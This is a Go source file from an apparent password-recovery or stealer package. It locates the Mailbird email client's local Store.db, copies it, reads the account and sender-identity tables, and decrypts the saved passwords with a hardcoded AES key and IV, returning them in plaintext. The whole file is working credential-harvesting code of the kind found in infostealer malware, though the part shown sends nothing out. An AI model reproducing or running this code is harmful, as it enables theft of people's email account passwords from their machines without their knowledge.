package recovery_passwords

func Recovery_passwords_Mailbird_by_accounts() []Logins_table_struct {
	mail_bird_path := Local_appdata + "\\Mailbird\\Store\\Store.db"
	result := []Logins_table_struct{}
	exist_flag, _ := PathExists(mail_bird_path)
	if exist_flag == true {
		local_temp := "local_temp"
		CopyFile(mail_bird_path, local_temp)
		Mysql, err := ConnectDB(local_temp)
		if err == nil {
			logins_table_struct_list, err := Mysql.ReadTable_mailbird_accounts()
			if err == nil {
				encryptionkey := []byte{0X35, 0XE0, 0X85, 0X30, 0X8A, 0X6D, 0X91, 0XA3, 0X96, 0X5F, 0XF2, 0X37, 0X95, 0XD1, 0XCF, 0X36,
					0X71, 0XDE, 0X7E, 0X5B, 0X62, 0X38, 0XD5, 0XFB, 0XDB, 0X64, 0XA6, 0X4B, 0XD3, 0X5A, 0X05, 0X53}
				IV := []byte{0X98, 0X0F, 0X68, 0XCE, 0X77, 0X43, 0X4C, 0X47, 0XF9, 0XE9, 0X0E, 0X82, 0XF4, 0X6B, 0X4C, 0XE8}
				for _, logins_table_struct := range logins_table_struct_list {
					decrypt_result, flag_result := AESDncrypt(logins_table_struct.Password_value, encryptionkey, IV)
					if flag_result == nil {
						logins_table_struct.Password_value = decrypt_result
					} else {
					}
					result = append(result, logins_table_struct)
				}
			} else {
			}
		} else {
		}
	} else {
	}
	return result
}

func Recovery_passwords_Mailbird_by_senderIdentities() []Logins_table_struct {
	mail_bird_path := Local_appdata + "\\Mailbird\\Store\\Store.db"
	result := []Logins_table_struct{}
	exist_flag, _ := PathExists(mail_bird_path)
	if exist_flag == true {
		local_temp := "local_temp"
		CopyFile(mail_bird_path, local_temp)
		Mysql, err := ConnectDB(local_temp)
		if err == nil {
			logins_table_struct_list, err := Mysql.ReadTable_mailbird_senderIdentities()
			if err == nil {
				encryptionkey := []byte{0X35, 0XE0, 0X85, 0X30, 0X8A, 0X6D, 0X91, 0XA3, 0X96, 0X5F, 0XF2, 0X37, 0X95, 0XD1, 0XCF, 0X36,
					0X71, 0XDE, 0X7E, 0X5B, 0X62, 0X38, 0XD5, 0XFB, 0XDB, 0X64, 0XA6, 0X4B, 0XD3, 0X5A, 0X05, 0X53}
				IV := []byte{0X98, 0X0F, 0X68, 0XCE, 0X77, 0X43, 0X4C, 0X47, 0XF9, 0XE9, 0X0E, 0X82, 0XF4, 0X6B, 0X4C, 0XE8}
				for _, logins_table_struct := range logins_table_struct_list {
					if len(logins_table_struct.Password_value) > 3 {
						decrypt_result, flag_result := AESDncrypt(logins_table_struct.Password_value, encryptionkey, IV)
						if flag_result == nil {
							logins_table_struct.Password_value = decrypt_result
						} else {
						}
					} else {
					}
					result = append(result, logins_table_struct)
				}
			} else {
			}
		} else {
		}
	} else {
	}
	return result
}

func Recovery_passwords_mailbirds() map[string][]Logins_table_struct {
	result_map := make(map[string][]Logins_table_struct)
	result := Recovery_passwords_Mailbird_by_accounts()
	if len(result) > 0 {
		result_map["Mailbirds"] = result
	}

	result = Recovery_passwords_Mailbird_by_senderIdentities()
	if len(result) > 0 {
		result_map["Mailbirds"] = append(result_map["Mailbirds"], result...)
	}
	return result_map

}
